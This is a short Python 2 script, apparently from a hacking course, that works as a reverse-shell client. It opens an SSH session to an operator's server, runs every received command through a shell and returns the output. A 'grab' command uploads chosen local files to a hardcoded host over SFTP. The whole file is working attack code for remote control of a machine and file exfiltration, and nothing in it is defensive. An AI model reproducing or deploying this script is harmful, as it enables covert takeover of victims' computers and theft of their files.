import paramiko
import threading
import subprocess


def sftp(local_path, name):
    try:
        print name
        print local_path
        transport = paramiko.Transport(('192.168.1.71',21))
        transport.connect(username='root', password='<Your root password>')
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_path, '/root/Desktop/upload/' + name)
        sftp.put
        sftp.close()
        transport.close()
        print 'DONE'
        return '[+] Done'
    except Exception, e:
        return str(e)

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('<IP address of server>', username='root', password='toor')
chan = client.get_transport().open_session()
chan.send('Hey I am connected :) ')
print chan.recv(1024)
while True:
    command = chan.recv(1024)
    if 'grab' in command:
        grab, name, path = command.split('*')
        chan.send(sftp(path,name))
    try:
        if command == 'exit':
            print 'exit command received'
            break
        CMD = subprocess.check_output(command, shell=True)
        chan.send(CMD)
    except Exception, e:
        chan.send(str(e))
client.close